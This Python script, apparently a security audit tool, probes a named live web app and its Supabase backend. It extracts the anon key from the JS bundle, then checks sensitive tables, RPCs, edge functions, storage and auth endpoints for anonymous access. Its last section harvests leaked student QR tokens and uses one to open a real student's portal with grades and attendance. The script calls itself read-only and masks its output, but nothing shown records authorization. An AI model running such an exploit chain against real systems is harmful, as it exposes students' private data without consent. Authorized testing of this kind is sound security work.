#!/usr/bin/env python3
"""El No5ba — low-volume dynamic probes (read-only, non-destructive).
Extracts the public anon key from the live bundle, then probes:
headers/TLS, anon REST/RPC, edge functions, storage, QR, robots, sourcemaps.
All outputs masked. Request budget kept minimal (~60 requests)."""
import json, re, ssl, sys, urllib.request, urllib.error, uuid

PROD = 'https://al-nokhbba.vercel.app'
SUPA = None  # filled after bundle parse
ANON = None

def req(url, method='GET', headers=None, body=None, timeout=20):
    r = urllib.request.Request(url, method=method, data=body.encode() if isinstance(body, str) else body)
    for k, v in (headers or {}).items():
        r.add_header(k, v)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read().decode('utf-8', 'ignore')
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode('utf-8', 'ignore')[:2000]
    except Exception as e:
        return None, {}, f'ERR {e}'

def mask(s):
    s = str(s)
    return s[:10] + '…' + s[-4:] if len(s) > 18 else s

print('════ 1) BUNDLE → SUPABASE URL/ANON KEY (masked) ════')
st, hd, html = req(PROD + '/')
entry = re.search(r'src="(/assets/index-[^"]+\.js)"', html) or re.search(r'(/assets/index-[^"]+\.js)', html)
entry_url = PROD + entry.group(1)
st2, _, js = req(entry_url)
chunks = re.findall(r'assets/[A-Za-z0-9_-]+\.js', js)
seen_js = js
for c in list(dict.fromkeys(chunks))[:40]:
    _, _, cj = req(PROD + '/' + c)
    if 'supabase' in cj:
        seen_js += cj
    if re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ', cj):
        seen_js = cj
        break
m_url = re.search(r'https://[a-z0-9]{20}\.supabase\.co', seen_js)
SUPA = m_url.group(0) if m_url else None
m_key = re.search(r'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', seen_js)
ANON = m_key.group(0) if m_key else None
print('supabase_url:', SUPA)
print('anon_key:', mask(ANON) if ANON else 'NOT FOUND IN BUNDLE')

print('\n════ 2) SECURITY HEADERS + TLS ════')
interesting = ['content-security-policy', 'strict-transport-security', 'x-frame-options',
               'x-content-type-options', 'referrer-policy', 'permissions-policy']
for h in interesting:
    v = hd.get(h) or hd.get(h.title())
    print(f"{h}: {'SET (' + str(len(v)) + ' chars)' if v else 'MISSING'}")
if hd.get('content-security-policy'):
    print('  CSP script-src detail:', re.search(r"script-src[^;]*", hd['content-security-policy']).group(0))
ctx = ssl.create_default_context()
import socket
try:
    hostname = 'al-nokhbba.vercel.app'
    with socket.create_connection((hostname, 443), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
            print('TLS:', ssock.version(), '| cert CN:', dict(x[0] for x in ssock.getpeercert()['subject']).get('commonName'))
except Exception as e:
    print('TLS probe err:', e)

print('\n════ 3) ANON REST ACCESS TO SENSITIVE TABLES ════')
H = {'apikey': ANON, 'Authorization': 'Bearer ' + ANON}
tables = ['profiles', 'students', 'attendance_records', 'exam_scores', 'exams', 'session_logs',
          'behavior_logs', 'student_payments', 'teacher_settings', 'student_notifications',
          'student_qr_tokens', 'backups', 'backup_settings', 'admin_audit_logs', 'admin_activity_log',
          'admin_support_sessions', 'push_notification_jobs', 'whatsapp_send_log', 'subscription_renewals',
          'centers', 'center_students', 'center_members', 'center_audit_logs', 'edge_rate_limits',
          'login_attempts', 'analytics_reports', 'announcements', 'homework_tasks', 'workspace_members']
leaks = []
for t in tables:
    st, rh, body = req(f'{SUPA}/rest/v1/{t}?select=*&limit=1', headers=H)
    snippet = ''
    rows = None
    try:
        j = json.loads(body)
        if isinstance(j, list): rows = j
        elif isinstance(j, dict) and 'message' in j: snippet = j['message'][:60]
    except Exception:
        snippet = body[:60]
    status = st
    n = len(rows) if rows is not None else '-'
    verdict = 'NO-LEAK' if (st in (200, 401, 403, 404) and (rows is not None and len(rows) == 0 or st in (401, 403, 404))) else ('LEAK?' if rows else 'BLOCKED')
    if rows:
        leaks.append((t, st, n))
    print(f"{t:28s} HTTP {st} rows={n} {snippet if rows is None else ''}")
print('LEAKED TABLES:', leaks if leaks else 'NONE')

print('\n════ 4) ANON RPC PROBES ════')
rpc_tests = [
    ('get_student_portal_data', {'p_token': 'zzzzzzzzzzzzzzzzzzzz'}, 'invalid token → expect null/4xx'),
    ('get_student_portal_access', {'p_token': str(uuid.uuid4())}, 'random student UUID → expect null (fallback check)'),
    ('get_portal_teacher_name', {'p_token': 'zzzzzzzzzzzzzzzzzzzz'}, 'expect null'),
    ('mark_notification_read', {'p_notification_id': str(uuid.uuid4()), 'p_token': 'zzzzzzzzzzzzzzzzzzzz'}, 'expect exception'),
    ('is_locked_out', {'check_email': 'probe-' + str(uuid.uuid4())[:8] + '@example.com'}, 'expect false'),
    ('consume_rate_limit', {'p_key': 'audit-probe', 'p_max': 5, 'p_window_seconds': 60}, 'expect DENIED (service_role only)'),
    ('admin_log_audit', {'p_action': 'audit_probe'}, 'expect DENIED'),
    ('create_center', {'p_name': 'audit-probe-center'}, 'expect auth required'),
]
for fn, args, note in rpc_tests:
    st, _, body = req(f'{SUPA}/rest/v1/rpc/{fn}', method='POST',
                      headers={**H, 'Content-Type': 'application/json'}, body=json.dumps(args))
    print(f"{fn:32s} HTTP {st}  {body[:110].replace(chr(10),' ')}")

print('\n════ 5) EDGE FUNCTIONS (unauth + anon) ════')
FN = f'{SUPA}/functions/v1'
for name, payload in [('admin-account-actions', {'action': 'confirm_account', 'targetUserId': str(uuid.uuid4())}),
                      ('admin-backup', {'action': 'create'}),
                      ('send-push-notification', {'job': {'id': str(uuid.uuid4()), 'teacher_id': str(uuid.uuid4())}})]:
    st, rh, body = req(f'{FN}/{name}', method='POST', headers={'Content-Type': 'application/json'}, body=json.dumps(payload))
    print(f"{name:26s} no-auth    HTTP {st}  {body[:90].replace(chr(10),' ')}")
    st, rh, body = req(f'{FN}/{name}', method='POST',
                       headers={'Content-Type': 'application/json', 'apikey': ANON, 'Authorization': 'Bearer ' + ANON},
                       body=json.dumps(payload))
    print(f"{name:26s} anon-jwt   HTTP {st}  {body[:90].replace(chr(10),' ')}")
    st, rh, body = req(f'{FN}/{name}', method='OPTIONS', headers={'Origin': 'https://evil.example', 'Access-Control-Request-Method': 'POST'})
    acao = rh.get('access-control-allow-origin') or rh.get('Access-Control-Allow-Origin')
    print(f"{name:26s} OPTIONS    HTTP {st}  ACAO={acao}")

print('\n════ 6) STORAGE ════')
for bucket in ['admin-backups', 'student-qr', 'teacher-logos']:
    st, _, body = req(f'{SUPA}/storage/v1/object/list/{bucket}', method='POST',
                      headers={**H, 'Content-Type': 'application/json'}, body=json.dumps({'prefix': '', 'limit': 5}))
    print(f"list/{bucket:14s} HTTP {st}  {body[:120].replace(chr(10),' ')}")
    st, _, body = req(f'{SUPA}/storage/v1/object/public/{bucket}/probe-test.bin')
    print(f"public-object/{bucket:14s} HTTP {st}")

print('\n════ 7) QR + PUBLIC PAGE BEHAVIOR ════')
st, _, body = req(PROD + '/qr/zzzzzzzzzzzzzzzzzzzz')
print(f"/qr/random-token    HTTP {st}  (SPA shell {len(body)} bytes, contains app div: {'id=\"root\"' in body})")
st, _, body = req(PROD + '/robots.txt')
print(f"robots.txt          HTTP {st}  {body[:100].strip()[:100]!r}")
st, _, body = req(PROD + '/deploy/admin-backup-index.txt')
print(f"/deploy/admin-backup-index.txt HTTP {st}  size≈{len(body)} (source-code disclosure check)")

print('\n════ 8) SOURCEMAP EXPOSURE ════')
st, _, _ = req(entry_url + '.map')
print(f"entry .map          HTTP {st}")

print('\n════ 9) AUTH ENUMERATION SIGNAL (single request) ════')
st, _, body = req(f'{SUPA}/auth/v1/token?grant_type=password', method='POST',
                  headers={'apikey': ANON, 'Content-Type': 'application/json'},
                  body=json.dumps({'email': f'auditprobe-{uuid.uuid4().hex[:8]}@example.com', 'password': 'WrongPass123!'}))
print(f"token grant        HTTP {st}  {body[:140].replace(chr(10),' ')}")
st, _, body = req(f'{SUPA}/auth/v1/recover', method='POST',
                  headers={'apikey': ANON, 'Content-Type': 'application/json'},
                  body=json.dumps({'email': f'auditprobe-{uuid.uuid4().hex[:8]}@example.com'}))
print(f"recover (fake)     HTTP {st}  {body[:120].replace(chr(10),' ')}")

print('\n════ 10) OPENAPI / INFO DISCLOSURE ════')
st, _, body = req(f'{SUPA}/rest/v1/', headers=H)
titles = re.findall(r'"description":\s*"([^"]{2,60})"', body)[:8]
paths = len(re.findall(r'"/[a-z_]+":\s*\{', body))
print(f"OpenAPI root       HTTP {st}  paths≈{paths}")
print('\n════ 11) student_qr_tokens LEAK — scope + portal impact ════')
st, hd, body = req(f'{SUPA}/rest/v1/student_qr_tokens?select=id,token,student_id,created_at,updated_at,revoked_at&limit=1000',
                   headers={**H, 'Prefer': 'count=exact'})
try: qrows = json.loads(body) if body.startswith('[') else []
except Exception: qrows = []
print('HTTP', st, '| content-range:', hd.get('content-range', 'n/a'), '| rows visible to anon:', len(qrows))
def mv(v): return (str(v)[:6] + '…' + str(v)[-4:]) if v and len(str(v)) > 10 else str(v)
for r in qrows[:5]:
    print('  ROW:', {k: (mv(v) if k == 'token' else (str(v)[:8] + '…' if k in ('id', 'student_id') else v)) for k, v in r.items()})
if qrows and qrows[0].get('token'):
    st, _, pbody = req(f'{SUPA}/rest/v1/rpc/get_student_portal_data', method='POST',
                       headers={**H, 'Content-Type': 'application/json'},
                       body=json.dumps({'p_token': qrows[0]['token']}))
    print('portal RPC with leaked token → HTTP', st)
    try:
        pj = json.loads(pbody)
        if pj:
            sp = pj.get('student', {})
            print('  CHAIN CONFIRMED: portal opened for', (sp.get('name') or '?')[:2] + '***',
                  '| exam_scores:', len(pj.get('exam_scores', [])),
                  '| attendance:', len(pj.get('attendance', [])),
                  '| student code:', mv(sp.get('code')))
        else:
            print('  portal null (token dead/revoked)')
    except Exception:
        print('  parse err:', pbody[:150])

print('\nDONE')
